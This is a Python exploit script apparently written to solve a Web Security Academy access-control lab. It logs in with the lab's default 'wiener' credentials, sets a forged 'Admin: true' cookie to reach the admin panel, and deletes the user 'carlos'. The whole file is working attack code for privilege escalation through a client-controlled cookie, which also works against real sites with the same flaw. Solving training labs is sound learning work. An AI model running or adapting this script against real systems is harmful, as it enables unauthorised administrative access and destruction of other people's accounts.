#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse
import re
from bs4 import BeautifulSoup

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


## Setup Proxies for future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 2'
                                ,description="Description: Accesses admin panel with forgeable cookie\nand delete carlos' user"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")
args = parser.parse_args()


#####################
#    Functions      #
#####################
def get_csrf_token(s, url):
    print("[+] Retriving the CSRF Token")
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    if csrf:
        print("[+] CSRF retrieved")
        return csrf
    else:
        print("[-] Something wrong in CSRF")

def login(url, s, csrf_token):
    print("[+] Trying to log in as wiener user")
    login_url = url+"/login"
    
    #login as the wiener user
    data = {"csrf": csrf_token,
            "username": "wiener",
            "password": "peter"}

    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("[+] Successfully logged in as the wiener user.")
        
        # Retrieve session cookie
        session_cookie = r.cookies.get_dict().get('session')
        delete_user(url,session_cookie)
    else:
        print("[-] Failed to login as the wiener user.")
        sys.exit(-1)


def delete_user(url, session_cookie):
    print("[+] Accessing the admin panel and deleting Carlos' user")
    # Visit the admin panel and delete the user carlos
    delete_carlos_user_url = url + "/admin/delete?username=carlos"
    cookies = {'session': session_cookie, "Admin": "true"}
    r = requests.get(delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies)
    if r.status_code == 200:
        print('[+] Successfully deleted Carlos\' user.')
    else:
        print('[-] Failed to delete Carlos user.')
        sys.exit(-1)
    

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} -u <lab's url>")
        print(f"[+] Example: {sys.argv[0]} -u www.example.com")
        sys.exit(-1)

    url = args.url.rstrip('/')
    s = requests.Session()
    
    # get CSRF token from the login page
    login_url = url + "/login"   
    csrf_token = get_csrf_token(s, login_url)
    
    # do the login
    login(url,s,csrf_token)


if __name__ == "__main__":
    main()